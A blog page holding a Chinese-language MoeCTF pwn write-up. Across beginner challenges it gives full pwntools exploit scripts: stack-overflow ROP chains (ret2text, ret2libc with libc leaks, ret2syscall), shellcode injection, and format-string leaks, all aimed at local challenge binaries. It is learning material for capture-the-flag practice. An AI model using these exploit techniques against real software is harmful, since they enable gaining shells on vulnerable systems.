<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="author" content="Walt CSZ">
    
    
    
    
    
    
    <title>Walt&#39;s Blog</title>
    <link href="http://waltcsz.github.io" rel="prefetch" />

    
<link rel="stylesheet" href="/css/bootstrap.min.css">
<link rel="stylesheet" href="/css/aos.css">
<link rel="stylesheet" href="/css/style.css">

    
<script src="/js/jquery.min.js"></script>

    
<script src="/js/bootstrap.min.js"></script>

    
<script src="/js/aos.js"></script>

    
<script src="/js/highslide/highslide-full.min.js"></script>

    
<link rel="stylesheet" href="/js/highslide/highslide.css">

    <style type="text/css">
        @media (max-width: 768px) {
            body {
                background-color: #f0f0f0;
                background: url('/imgs/xsbg.gif');
                background-attachment: fixed;
            }
        }
    </style>
    
    <!--<script type="text/javascript">
      if (document.images) {
        var avatar = new Image();
        avatar.src = '/imgs/avatar.jpg'
        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg'.split(',')
        var previewsPreLoad = []
        for(var i = 0; i < length; i++) {
          previewsPreLoad.push(new Image())
          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
        }
      }
    </script>-->
<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <!-- 背景轮播图功能 -->
    <section class="hidden-xs">
    <ul class="cb-slideshow">
        <li><span>天若</span></li>
        <li><span>有情</span></li>
        <li><span>天亦老</span></li>
        <li><span>我为</span></li>
        <li><span>长者</span></li>
        <li><span>续一秒</span></li>
    </ul>
</section>
    <!-- 欧尼酱功能, 谁用谁知道 -->
    
    <header class="navbar navbar-inverse" id="gal-header">
    <div class="container">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed"
                    data-toggle="collapse" data-target=".bs-navbar-collapse"
                    aria-expanded="false">
                <span class="fa fa-lg fa-reorder"></span>
            </button>
            <a href="http://waltcsz.github.io">
                
                <style>
                    #gal-header .navbar-brand {
                        height: 54px;
                        line-height: 24px;
                        font-size: 28px;
                        opacity: 1;
                        background-color: rgba(0,0,0,0);
                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
                    }
                </style>
                <!-- 这里使用文字(navbar_text or config.title) -->
                <div class="navbar-brand">Walt&#39;s Blog</div>
                
            </a>
        </div>
        <div class="collapse navbar-collapse bs-navbar-collapse">
            <ul class="nav navbar-nav" id="menu-gal">
                
                
                <li class="">
                    <a href="/">
                        <i class="fa fa-home"></i>首页
                    </a>
                </li>
                
                
                
                <li class="">
                    <a href="/archives">
                        <i class="fa fa-archive"></i>归档
                    </a>
                </li>
                
                
                
                
                <li class="dropdown">
                    <!-- TODO 添加hover dropdown效果 -->
                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
                        <i class="fa fa-list"></i>分类
                    </a>
                    <ul class="dropdown-menu">
                        
                        
                        <li>
                            <a href="/categories/writeup/">writeup</a>
                        </li>
                        
                        
                        
                    </ul>
                </li>
                
                
                
                
                
                <li class="">
                    <a href="/tags">
                        <i class="fa fa-tags"></i>标签
                    </a>
                </li>
                
                
                
                
                <li class="">
                    <a href="/about">
                        <i class="fa fa-user"></i>关于我
                    </a>
                </li>
                
                
            </ul>
        </div>
    </div>
</header>
    <div id="gal-body">
        <div class="container">
            <div class="row">
                <div class="col-md-8 gal-right" id="mainstay">
                    
<article class="article well article-body" id="article">
    <div class="breadcrumb">
        <i class="fa fa-home"></i>
        <a href="http://waltcsz.github.io">Walt&#39;s Blog</a>
        >
        <span></span>
    </div>
    <!-- 大型设备详细文章 -->
    <div class="hidden-xs">
        <div class="title-article">
            <h1>
                <a href="/2023/08/12/writeUp/moectf/"></a>
            </h1>
        </div>
        <div class="tag-article">
            
            <span class="label label-gal">
                <i class="fa fa-calendar"></i> 2023-08-12
            </span>
            
        </div>
    </div>
    <!-- 小型设备详细文章 -->
    <div class="visible-xs">
        <center>
            <div class="title-article">
                <h4>
                    <a href="/2023/08/12/writeUp/moectf/"></a>
                </h4>
            </div>
            <p>
                <i class="fa fa-calendar"></i> 2023-08-12
            </p>
            <p>
                
                
            </p>
        </center>
    </div>
    <div class="content-article">
        <h1 id="Moectf"><a href="#Moectf" class="headerlink" title="Moectf"></a>Moectf</h1><h2 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h2><p>了解了nc指令，在不使用pwntools的remote命令连接靶机时可以用。直接连接靶机更方便。</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/./moectf/image-20230820205449199-1698319262326-37.png" alt="image-20230820205449199" data-caption="image-20230820205449199" loading="lazy"></p>
<h2 id="baby-calculater"><a href="#baby-calculater" class="headerlink" title="baby_calculater"></a>baby_calculater</h2><p>完成100次算式校验就行，顺便学了一下python的正则匹配来简化代码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> re<br><br>p=remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;34599&#x27;</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;start!&#x27;</span>)<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-built_in">str</span>=p.recv().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    lst = re.findall(<span class="hljs-string">r&#x27;\d+&#x27;</span>, re.search(<span class="hljs-string">r&#x27;\d+[+]\d+[=]\d+&#x27;</span>, <span class="hljs-built_in">str</span>).group())<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(lst[<span class="hljs-number">0</span>])+<span class="hljs-built_in">int</span>(lst[<span class="hljs-number">1</span>])==<span class="hljs-built_in">int</span>(lst[<span class="hljs-number">2</span>]):<br>        p.sendline(<span class="hljs-string">&#x27;BlackBird&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p.sendline(<span class="hljs-string">&#x27;WingS&#x27;</span>)<br><span class="hljs-comment">#    sleep(0.5)</span><br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/./moectf/image-20230820205900910.png" alt="image-20230820205900910" data-caption="image-20230820205900910" loading="lazy"></p>
<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>题目提到fd（file descriptor) 以及源码中有dup2函数，是新知识，便查了一下。</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/./moectf/image-20230820210247331.png" alt="image-20230820210247331" data-caption="image-20230820210247331" loading="lazy"></p>
<p>打开文件会创建一个文件描述符fd，指向该文件（可以多个fd指向同一文件）。dup2的用途就是将作为第二个参数的fd重定向为第一个参数所指文件。</p>
<p>dup(oldfd)则是创建一个新的fd指向原fd所指文件。</p>
<p>fd本质是从0到OPEN_MAX-1的整数。0为标准输入，1为标准输出，2为错误输出。创立新fd时，会在 files_struct 数组当中，找到当前没有被使用的最小的一个下标，作为新的文件描述符。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/TheWindRisesll/article/details/86484550">文件描述符分配</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/364617329">文件描述符由来</a></p>
<p>该程序打开flag文件所分配的fd应为3。那么该程序中new_fd的值应该为3&lt;&lt;4 | 0x29A，即为670.</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/./moectf/image-20230820211002759.png" alt="image-20230820211002759" data-caption="image-20230820211002759" loading="lazy"></p>
<p>后面程序中将获取的输入作为fd进行读取，因此输入670即可获得flag。</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/./moectf/image-20230820211140349.png" alt="image-20230820211140349" data-caption="image-20230820211140349" loading="lazy"></p>
<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p>不允许输入符号，输入值为-114514得flag，在64位整数下输入-114514然后将高位全部清0即可</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/./moectf/image-20230820211656633.png" alt="image-20230820211656633" data-caption="image-20230820211656633" loading="lazy"></p>
<h2 id="ret2text-32"><a href="#ret2text-32" class="headerlink" title="ret2text_32"></a>ret2text_32</h2><p>基础</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./pwn1&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">38079</span>)<br><br>offset = <span class="hljs-number">0x58</span> + <span class="hljs-number">4</span><br>offset = <span class="hljs-number">92</span><br>binsh = <span class="hljs-number">0x0804C02C</span><br>sys = <span class="hljs-number">0x080492a9</span><br>vln = <span class="hljs-number">0x08049213</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;age?&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;200&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;flow!&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*offset + p32(sys) + p32(binsh) + p32(vln)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="ret2text-64"><a href="#ret2text-64" class="headerlink" title="ret2text_64"></a>ret2text_64</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#p = process (&#x27;./1&#x27;)</span><br>p=remote (<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">35035</span>)<br>rdi_ret = <span class="hljs-number">0x04011be</span><br>sys = <span class="hljs-number">0x04012b7</span><br>binsh = <span class="hljs-number">0x0404050</span><br><br>offset=<span class="hljs-number">0x50</span>+<span class="hljs-number">0x8</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*offset + p64(rdi_ret) + p64(binsh) + p64 (sys) <br>p.recvuntil(<span class="hljs-string">b&#x27;age?&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;200&#x27;</span>)<br>p.recvuntil (<span class="hljs-string">b&#x27;flow!&#x27;</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="shellcode-level0"><a href="#shellcode-level0" class="headerlink" title="shellcode_level0"></a>shellcode_level0</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">34683</span>)<br><span class="hljs-comment">#p=process(&#x27;./shellcode_level0&#x27;)</span><br><br>sh=shellcraft.sh()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(sh))<br>payload = asm(sh)<br><span class="hljs-built_in">print</span>(payload)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="shellcode-level1"><a href="#shellcode-level1" class="headerlink" title="shellcode_level1"></a>shellcode_level1</h2><p>之前不知道设置context，所以64位的ret2shellcode一直写不出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">35885</span>)<br><span class="hljs-comment">#p=process(&#x27;./shellcode_level1&#x27;)</span><br><br>sh=shellcraft.sh()<br><br>payload = asm(sh)<br>p.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="format-level0"><a href="#format-level0" class="headerlink" title="format_level0"></a>format_level0</h2><p>一眼printf漏洞，但是泄露flag后处理编码问题突然有点转不过来了。</p>
<p>read读入flag内容放入栈中，以bytes形式储存在栈中。设str为%c%c串应该可以直接输出，但可能因为函数调参只能4字节的调，所以每4字节漏3个。</p>
<p>因此以%x链输出内存，然后bytes的格式打印出内存内容。需要先转换成16进制的数字，然后用p32函数再转回正常的bytes字节。</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/./moectf/image-20230820212525820.png" alt="image-20230820212525820" data-caption="image-20230820212525820" loading="lazy"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#p= process(&#x27;./format_level0&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">38269</span>)<br><span class="hljs-comment">#gdb.attach(p, &#x27;b printf&#x27;)</span><br><br><span class="hljs-comment">#payload = b&#x27;aa%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c&#x27;</span><br>payload = <span class="hljs-string">b&#x27;aa%x%x%x%x%x%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>p.recv()<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;is: &#x27;</span>)<br><span class="hljs-built_in">str</span> = p.recv()<br>lst = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">b&#x27;-&#x27;</span>)[<span class="hljs-number">1</span>:]<br><span class="hljs-built_in">print</span>(lst)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lst:<br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">b&#x27;&#x27;</span><br>    tmp = p32(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>))<br>    <span class="hljs-built_in">print</span>(tmp.decode(), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">str</span> += tmp<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br></code></pre></td></tr></table></figure>

<h2 id="PIE-enabled"><a href="#PIE-enabled" class="headerlink" title="PIE_enabled"></a>PIE_enabled</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&#x27;./PIE_enabled&#x27;</span>)<br><br>p=remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;43479&#x27;</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;address is:&#x27;</span>)<br>ptr = <span class="hljs-built_in">int</span>(p.recv(),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(ptr)<br>binsh=<span class="hljs-number">0x4010</span><br>sys=<span class="hljs-number">0x11d8</span><br>rdi_ret = <span class="hljs-number">0x1323</span><br>vuln = <span class="hljs-number">0x1245</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cg</span>(<span class="hljs-params">x</span>):<br>    tmp = ptr - vuln<br>    <span class="hljs-keyword">return</span> tmp+x<br>offset = <span class="hljs-number">0x50</span> + <span class="hljs-number">8</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*offset + p64(cg(rdi_ret)) + p64(cg(binsh)) + p64(cg(sys)) + p64(ptr)<br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>套模板，泄露地址后计算偏移</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p=remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">35995</span>)<br><span class="hljs-comment">#p=process(&#x27;./ret2libc&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p,&#x27;b *0x0&#x27;)</span><br>e = ELF(<span class="hljs-string">&#x27;./ret2libc&#x27;</span>)<br><br>puts_p = e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>lsm_g = e.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>puts_g = e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>offset = <span class="hljs-number">0x050</span> + <span class="hljs-number">8</span><br><br>main_a = e.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>exit_a = main_a<br>prdi = <span class="hljs-number">0x040117e</span><br>ret = <span class="hljs-number">0x040101a</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ready</span>():<br>    p.recvuntil(<span class="hljs-string">b&#x27;help u??\n\n&#x27;</span>)<br>    <span class="hljs-keyword">pass</span><br>    <br>ready()<br><br>payload = offset * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(prdi)  + p64(lsm_g) + p64(puts_p)+ p64(main_a)<br>p.sendline(payload)<br><br><br>lsm_a = u64(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;the true address of __libc_start_main is %#x&#x27;</span>%lsm_a)<br><br><span class="hljs-comment">#&#x27;&#x27;&#x27;</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>,lsm_a)<br>libcbase = lsm_a - libc.dump(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>)<br>sys_a = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bs_a = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">libc = ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="hljs-string">libcbase = lsm_a - libc.sym[&#x27;__libc_start_main&#x27;]</span><br><span class="hljs-string">sys_a = libcbase + libc.sym[&#x27;system&#x27;]</span><br><span class="hljs-string">bs_a = libcbase + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>ready()<br>payload = offset * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(ret) + p64(prdi) + p64(bs_a) + p64(sys_a) + p64(exit_a)<br>p.send(payload)<br>p.interactive()<br>p.close()<br><br></code></pre></td></tr></table></figure>

<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>网上关于ret2syscall的资料非常少，大部分都是32位的，而且抄来抄去的。整理理解完，原理如下。</p>
<p>系统调用其实就是当汇编指令为int 0x80（32位）或者syscall（64位）时，cpu将中断运行，并执行系统调用号对应的函数。而系统调用号需事先储存在eax或rax。</p>
<p>32位需将参数依次放入ebx，ecx，edx。而64位与原先一致，即rdi, rsi, rdx。</p>
<p>未开启沙盒下，可以构造如下函数直接getshell</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>);	<span class="hljs-comment">//字符串地址,0,0</span><br></code></pre></td></tr></table></figure>

<p>可用如下指令查看64位程序中syscall的地址</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary ret2syscall --only <span class="hljs-string">&#x27;syscall&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/./moectf/image-20230820214239260.png" alt="image-20230820214239260" data-caption="image-20230820214239260" loading="lazy"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p=remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">38659</span>)<br><span class="hljs-comment">#p=process(&#x27;./ret2syscall&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p,&#x27;b *0x0&#x27;)</span><br><br>sc = <span class="hljs-number">0x0401185</span><br>binsh = <span class="hljs-number">0x0404040</span><br>p_rax = <span class="hljs-number">0x040117e</span><br>p_rdi = <span class="hljs-number">0x0401180</span><br>p_rsi_rdx = <span class="hljs-number">0x0401182</span><br><br>offset = <span class="hljs-number">0x040</span> + <span class="hljs-number">8</span><br><br>payload = offset * <span class="hljs-string">b&#x27;a&#x27;</span> + p64(p_rdi) + p64(binsh) + p64(p_rax) + p64(<span class="hljs-number">0x3b</span>) + p64(p_rsi_rdx) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) +p64(sc)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(payload))<br>p.send(payload)<br><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure>

<h2 id="shellcode-level2"><a href="#shellcode-level2" class="headerlink" title="shellcode_level2"></a>shellcode_level2</h2><p>无法编译，直接看汇编。</p>
<img onerror="imgOnError(this);" data-fancybox="gallery" src="./moectf/image-20230820214550469.png" alt="image-20230820214550469" data-caption="image-20230820214550469" loading="lazy">

<p>memset会清空输入。</p>
<p>jz short loc_1250可以直接跳到执行shellcode的命令。而该指令在ZF&#x3D;0时生效。</p>
<p>test al, al为对两数进行位与，结果为0时，ZF为0，否则为1。al来源于rax低8位，rax来源于s字符串首位，因此将字符串首位设置为0即可跳过menset。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/r1553789169/article/details/109965726">test用法</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">38393</span>)<br><span class="hljs-comment">#p=process(&#x27;./shellcode_level1&#x27;)</span><br><br>sh=shellcraft.sh()<br>payload = <span class="hljs-string">b&#x27;\0&#x27;</span>+ asm(sh)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="format-level1"><a href="#format-level1" class="headerlink" title="format_level1"></a>format_level1</h2><p>%x$n的运用，x为任意数</p>
